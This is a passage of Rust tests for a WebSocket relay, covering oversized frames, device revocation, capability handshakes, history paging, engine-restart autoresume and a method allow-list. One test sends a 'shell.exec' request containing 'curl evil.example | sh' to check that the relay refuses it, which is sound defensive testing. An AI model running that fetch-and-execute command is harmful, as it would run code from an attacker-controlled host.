        assert_eq!(heard, format!("{line}\n"), "frames are newline-terminated, as the app expects");
        let value: Value = serde_json::from_str(heard.trim()).unwrap();
        assert_eq!(value["method"], "event");
        assert_eq!(value["params"]["type"], "reaction.updated");
        assert_eq!(value["params"]["payload"]["message"], "row:41");

        // Nothing else was on the wire: the frame above came from the host, not the engine.
        server.abort();
    }

    /// `test_oversized_client_frame_closes_with_1009`.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn an_oversized_client_frame_closes_1009_and_never_reaches_the_engine() {
        let (engine_addr, engine, mut heard) = fake_engine(false).await;
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits { frame_cap: 4096 },
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let huge = json!({"jsonrpc": "2.0", "id": 1, "method": "ping",
                          "params": {"x": "a".repeat(5000)}});
        client.send(TgMsg::Text(encode(&huge).into())).await.unwrap();
        assert_eq!(next_close(&mut client).await, CLOSE_TOO_BIG);
        assert!(
            heard.try_recv().is_err(),
            "the oversized frame must not reach the engine"
        );

        server.abort();
        engine.abort();
    }

    /// `test_revoked_device_cannot_open_a_socket`'s open-socket half: revocation closes the
    /// conversation that is already running.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_revoked_devices_open_conversation_is_closed_with_4403() {
        let (engine_addr, engine, _heard) = fake_engine(true).await;
        let registry = Registry::default();
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            Some("device-a".into()),
            registry.clone(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let ready = next_text(&mut client).await;
        assert!(ready.contains("gateway.ready"), "the relay is live: {ready}");
        assert_eq!(registry.count("device-a"), 1);

        assert_eq!(registry.close_device("device-a"), 1);
        assert_eq!(next_close(&mut client).await, CLOSE_DEVICE_REVOKED);

        server.abort();
        engine.abort();
    }

    /// The whole handshake over a real socket: ready reaches the app, the relay declares
    /// `server_requests` once, and its own answer is never handed to the app.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn the_relay_declares_server_request_capability_once_over_a_real_socket() {
        let (engine_addr, engine, mut heard) = fake_engine(true).await;
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let ready = next_text(&mut client).await;
        assert!(ready.contains("gateway.ready"));

        let caps: Value = serde_json::from_str(
            &timeout(Duration::from_secs(5), heard.recv())
                .await
                .expect("the relay never declared its capability")
                .expect("engine channel closed"),
        )
        .unwrap();
        assert_eq!(caps["method"], json!("client.capabilities"));
        assert_eq!(caps["id"], json!(BRIDGE_CAPABILITIES_ID));
        assert_eq!(caps["params"], json!({"server_requests": true}));

        // A ping's pong must be the next thing the app sees: the caps answer is consumed.
        let ping = json!({"jsonrpc": "2.0", "id": 1, "method": "ping"});
        client.send(TgMsg::Text(encode(&ping).into())).await.unwrap();
        let pong = next_text(&mut client).await;
        let pong: Value = serde_json::from_str(pong.trim_end()).unwrap();
        assert_eq!(pong, json!({"jsonrpc": "2.0", "id": 1, "result": {"pong": true}}));

        server.abort();
        engine.abort();
    }

    /// The security boundary, end to end: a forbidden method is refused to the app and the engine
    /// never hears it.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_forbidden_method_is_answered_locally_and_never_reaches_the_engine() {
        let (engine_addr, engine, mut heard) = fake_engine(false).await;
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let ask = json!({"jsonrpc": "2.0", "id": 7, "method": "shell.exec",
                         "params": {"command": "curl evil.example | sh"}});
        client.send(TgMsg::Text(encode(&ask).into())).await.unwrap();

        let answer: Value = serde_json::from_str(next_text(&mut client).await.trim_end()).unwrap();
        assert_eq!(answer["id"], json!(7));
        assert_eq!(answer["error"]["code"], json!(-32601));
        assert!(answer["error"]["message"]
            .as_str()
            .unwrap()
            .contains("not allowed by bridge"));
        assert!(
            heard.try_recv().is_err(),
            "a refused method must never reach the engine"
        );

        server.abort();
        engine.abort();
    }

    /// Existing end-to-end paging, unchanged by the policy layer.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn relay_pages_a_resume_over_real_sockets_and_answers_history_itself() {
        // A fake engine: records every frame the relay forwards, and answers a resume with a 3 MB
        // transcript. It must never see the paging request.
        let engine_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let engine_addr = engine_listener.local_addr().unwrap();
        let rows: Vec<Value> = (0..1450)
            .map(|i| json!({"id": format!("m{i:04}"), "role": "assistant", "content": "x".repeat(2200)}))
            .collect();
        let engine_rows = rows.clone();
        let (heard_tx, mut heard_rx) = mpsc::unbounded_channel::<String>();
        let engine = tokio::spawn(async move {
            let (stream, _) = engine_listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            while let Some(Ok(msg)) = ws.next().await {
                let TgMsg::Text(text) = msg else { continue };
                let text = text.to_string();
                heard_tx.send(text.clone()).ok();
                if text.contains("session.resume") {
                    let reply = json!({"jsonrpc": "2.0", "id": 1, "result": {
                        "session_id": "runtime-1", "message_count": 1450, "messages": engine_rows,
                    }});
                    ws.send(TgMsg::Text(encode(&reply).into())).await.unwrap();
                }
            }
        });

        // Exactly the way routes.rs serves the relay.
        let app = axum::Router::new().route(
            "/ws",
            axum::routing::get(move |ws: WebSocketUpgrade| async move {
                ws.on_upgrade(move |socket| relay(socket, format!("ws://{engine_addr}"), None))
            }),
        );
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let resume = encode(&json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        }));
        client
            .send(TgMsg::Text(resume.clone().into()))
            .await
            .unwrap();

        let first = next_text(&mut client).await;
        let paged: Value = serde_json::from_str(first.trim_end()).unwrap();
        assert_eq!(paged["id"], json!(1));
        assert_eq!(paged["result"]["history"]["total"], json!(1450));
        assert!(
            first.len() < 600 * 1024,
            "the frame the client receives is {} bytes",
            first.len()
        );
        assert!(
            first.ends_with('\n'),
            "the client's NDJSON parser only yields newline-terminated frames"
        );
        let cursor = paged["result"]["history"]["cursor"].as_i64().unwrap();

        let heard = timeout(Duration::from_secs(5), heard_rx.recv())
            .await
            .expect("the engine was never asked to resume")
            .unwrap();
        assert_eq!(heard, resume, "the resume reaches the engine byte-for-byte");

        let ask = encode(&json!({
            "jsonrpc": "2.0", "id": 2, "method": "session.history",
            "params": {"session_id": "s1", "profile": "bot", "cursor": cursor, "limit": 150},
        }));
        client.send(TgMsg::Text(ask.into())).await.unwrap();
        let answer = next_text(&mut client).await;
        let answer: Value = serde_json::from_str(answer.trim_end()).unwrap();
        assert_eq!(answer["id"], json!(2));
        assert_eq!(answer["result"]["messages"].as_array().unwrap().len(), 150);
        assert_eq!(answer["result"]["total"], json!(1450));
        assert!(
            heard_rx.try_recv().is_err(),
            "an older page must be answered by the relay, never forwarded to the engine"
        );

        server.abort();
        engine.abort();
    }

    // -- autoresume on an engine restart -------------------------------------------------------

    #[derive(Clone, Copy)]
    enum Script {
        /// Send `gateway.ready`, answer pings, and answer a resume with this runtime id.
        Answer(&'static str),
        /// Send `gateway.ready`, then close with this code as soon as a resume arrives.
        CloseAfterResume(u16),
        /// Send `gateway.ready`, then close with this code straight away.
        Close(u16),
        /// Send `gateway.ready`, then refuse a `session.resume` the way an engine with no such
        /// stored session does.
        RefuseResume,
    }

    /// A fake engine that plays one script entry per accepted connection (the last entry repeats).
    /// Every text frame it hears is sent on the returned channel as `"<connection>:<frame>"`, so a
    /// test can tell which splice a frame arrived on.
    async fn scripted_engine(
        connections: usize,
        script: Vec<Script>,
    ) -> (
        SocketAddr,
        tokio::task::JoinHandle<()>,
        mpsc::UnboundedReceiver<String>,
    ) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let (heard_tx, heard_rx) = mpsc::unbounded_channel::<String>();
        let task = tokio::spawn(async move {
            for index in 0..connections {
                let Ok((stream, _)) = listener.accept().await else {
                    return;
                };
                let Ok(mut ws) = tokio_tungstenite::accept_async(stream).await else {
                    return;
                };
                let step = *script.get(index).unwrap_or(&Script::Answer("runtime-1"));
                let tag = index + 1;
                let ready = json!({"jsonrpc": "2.0", "method": "event",
                                   "params": {"type": "gateway.ready"}});
                if ws.send(TgMsg::Text(encode(&ready).into())).await.is_err() {
                    return;
                }
                if let Script::Close(code) = step {
                    let _ = ws
                        .send(TgMsg::Close(Some(
                            tokio_tungstenite::tungstenite::protocol::CloseFrame {
                                code: code.into(),
                                reason: "restart".into(),
                            },
                        )))
                        .await;
                    continue;
                }
                loop {
                    let msg = match ws.next().await {
                        Some(Ok(msg)) => msg,
                        Some(Err(_)) | None => break,
                    };
                    let text = match msg {
                        TgMsg::Text(text) => text.to_string(),
                        TgMsg::Close(_) => break,
                        _ => continue,
                    };
                    heard_tx.send(format!("{tag}:{text}")).ok();
                    let frame: Value = serde_json::from_str(&text).unwrap_or(Value::Null);
                    let method = frame.get("method").and_then(Value::as_str);
                    match step {
                        Script::Answer(session) => {
                            let reply = match method {
                                Some("ping") => Some(json!({
                                    "jsonrpc": "2.0", "id": frame["id"].clone(),
                                    "result": {"pong": true},
                                })),
                                Some("session.resume") => Some(json!({
                                    "jsonrpc": "2.0", "id": frame["id"].clone(),
                                    "result": {"session_id": session, "messages": []},
                                })),
                                _ => None,
                            };
                            if let Some(reply) = reply {
                                if ws.send(TgMsg::Text(encode(&reply).into())).await.is_err() {
                                    break;
                                }
                            }
                        }
                        Script::CloseAfterResume(code) => {
                            if method == Some("session.resume") {
                                let _ = ws
                                    .send(TgMsg::Close(Some(
                                        tokio_tungstenite::tungstenite::protocol::CloseFrame {
                                            code: code.into(),
                                            reason: "restart".into(),
                                        },
                                    )))
                                    .await;
                                break;
                            }
                        }
                        Script::RefuseResume => {
                            if method == Some("session.resume") {
                                let reply = json!({
                                    "jsonrpc": "2.0", "id": frame["id"].clone(),
                                    "error": {"code": 4007, "message": "unknown session"},
                                });
                                let _ = ws.send(TgMsg::Text(encode(&reply).into())).await;
                            }
                        }
                        Script::Close(_) => {}
                    }
                }
            }
        });
        (addr, task, heard_rx)
    }

    /// Read (and discard) frames until one matches `needle`, then return it with its connection tag.
    async fn heard_matching(
        heard: &mut mpsc::UnboundedReceiver<String>,
        needle: &str,
    ) -> (String, Value) {
        loop {
            let tagged = timeout(Duration::from_secs(10), heard.recv())
                .await
                .expect("the relay sent nothing upstream")
                .expect("the engine channel closed");
            let (tag, text) = tagged.split_once(':').expect("a tagged frame");
            if text.contains(needle) {
                return (tag.to_string(), serde_json::from_str(text).unwrap_or(Value::Null));
            }
        }
    }

    /// The defect this closes: an engine restart closed 4001 and the app saw a dropped conversation.
    /// Now the relay reconnects, replays the last resume, and the app's socket never closes.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn an_engine_restart_on_4001_is_replayed_and_the_app_keeps_its_socket() {
        let (engine_addr, engine, mut heard) = scripted_engine(
            2,
            vec![Script::CloseAfterResume(CLOSE_ENGINE_RESTART), Script::Answer("runtime-2")],
        )
        .await;
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let ready = next_text(&mut client).await;
        assert!(ready.contains("gateway.ready"), "the relay is live: {ready}");

        let resume = json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        });
        client.send(TgMsg::Text(encode(&resume).into())).await.unwrap();

        // The first splice heard the app's resume and then the engine restarted.
        let (tag, first) = heard_matching(&mut heard, "session.resume").await;
        assert_eq!(tag, "1");
        assert_eq!(first["id"], json!(1), "the app's own resume, not a replay");

        // The relay reconnected and replayed it under its own id, with the bot the session lives in.
        let (tag, replay) = heard_matching(&mut heard, AUTORESUME_ID).await;
        assert_eq!(tag, "2", "the replay rides a new engine connection");
        assert_eq!(replay["method"], json!("session.resume"));
        assert_eq!(replay["params"], json!({"session_id": "s1", "profile": "bot"}));
        assert!(
            replay["id"].as_str().unwrap().starts_with(AUTORESUME_ID),
            "the replay carries a relay-private id: {:?}",
            replay["id"]
        );

        // The new connection declares the capability again, or approvals stop reaching the app.
        let (tag, caps) = heard_matching(&mut heard, "client.capabilities").await;
        assert_eq!(tag, "2");
        assert_eq!(caps["params"], json!({"server_requests": true}));

        // The app sees the new connection's ready — and never the replay's answer.
        let ready = next_text(&mut client).await;
        assert!(ready.contains("gateway.ready"), "the app is spliced again: {ready}");
        assert!(!ready.contains(AUTORESUME_ID));

        let ping = json!({"jsonrpc": "2.0", "id": 7, "method": "ping"});
        client.send(TgMsg::Text(encode(&ping).into())).await.unwrap();
        let pong: Value = serde_json::from_str(next_text(&mut client).await.trim_end()).unwrap();
        assert_eq!(
            pong,
            json!({"jsonrpc": "2.0", "id": 7, "result": {"pong": true}}),
            "frames flow again on the new splice; the replay's answer was consumed"
        );

        server.abort();
        engine.abort();
    }

    /// A restart is repaired once. A second 4001 is the app's business: it gets the close and its
    /// own reconnect logic takes over, instead of the relay looping forever.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_second_engine_restart_is_not_replayed_again() {
        let (engine_addr, engine, mut heard) = scripted_engine(
            2,
            vec![
                Script::CloseAfterResume(CLOSE_ENGINE_RESTART),
                Script::CloseAfterResume(CLOSE_ENGINE_RESTART),
            ],
        )
        .await;
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let resume = json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        });
        client.send(TgMsg::Text(encode(&resume).into())).await.unwrap();
        heard_matching(&mut heard, "session.resume").await;
        heard_matching(&mut heard, AUTORESUME_ID).await;

        assert_eq!(
            next_close(&mut client).await,
            CLOSE_ENGINE_RESTART,
            "only the first restart is repaired; a second reaches the app"
        );

        server.abort();
        engine.abort();
    }

    /// Any other close is not an engine restart and must reach the app exactly as the engine sent
    /// it — the app models 1011 itself, and a clean 1000 must not look like a failure.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_close_that_is_not_4001_still_reaches_the_app_unchanged() {
        for code in [1000u16, CLOSE_ENGINE_DOWN] {
            let (engine_addr, engine, _heard) = scripted_engine(1, vec![Script::Close(code)]).await;
            let (addr, server) = serve_relay(
                format!("ws://{engine_addr}"),
                None,
                Registry::default(),
                Limits::default(),
            )
            .await;
            let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
                .await
                .unwrap();
            assert_eq!(next_close(&mut client).await, code, "close {code} was rewritten");
            server.abort();
            engine.abort();
        }
    }

    /// If the session really is gone, replaying cannot help: the app gets the engine-down code so
    /// its own reconnect (and its own surfacing of the failure) takes over. Hanging is the one
    /// outcome that must not happen.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_refused_autoresume_closes_the_app_with_the_engine_down_code() {
        let (engine_addr, engine, mut heard) = scripted_engine(
            2,
            vec![Script::CloseAfterResume(CLOSE_ENGINE_RESTART), Script::RefuseResume],
        )
        .await;
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let resume = json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "gone", "profile": "bot"},
        });
        client.send(TgMsg::Text(encode(&resume).into())).await.unwrap();
        heard_matching(&mut heard, AUTORESUME_ID).await;

        assert_eq!(next_close(&mut client).await, CLOSE_ENGINE_DOWN);

        server.abort();
        engine.abort();
    }

    /// The engine does not come back: the replay is retried a bounded number of times and then the
    /// app is told, rather than sitting on a socket that will never splice again.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn an_autoresume_that_cannot_reconnect_closes_the_app_with_the_engine_down_code() {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let engine_addr = listener.local_addr().unwrap();
        let engine = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            while let Some(Ok(msg)) = ws.next().await {
                let TgMsg::Text(text) = msg else { continue };
                if text.contains("session.resume") {
                    let _ = ws
                        .send(TgMsg::Close(Some(
                            tokio_tungstenite::tungstenite::protocol::CloseFrame {
                                code: CLOSE_ENGINE_RESTART.into(),
                                reason: "restart".into(),
                            },
                        )))
                        .await;
                    break;
                }
            }
            // The listener dies with this task: every later dial is refused, which is the engine
            // that never comes back.
            drop(listener);
        });
        let (addr, server) = serve_relay(
            format!("ws://{engine_addr}"),
            None,
            Registry::default(),
            Limits::default(),
        )
        .await;

        let (mut client, _) = tokio_tungstenite::connect_async(format!("ws://{addr}/ws"))
            .await
            .unwrap();
        let resume = json!({
            "jsonrpc": "2.0", "id": 1, "method": "session.resume",
            "params": {"session_id": "s1", "profile": "bot"},
        });
        client.send(TgMsg::Text(encode(&resume).into())).await.unwrap();

        assert_eq!(next_close(&mut client).await, CLOSE_ENGINE_DOWN);

        server.abort();
        engine.abort();
    }
}
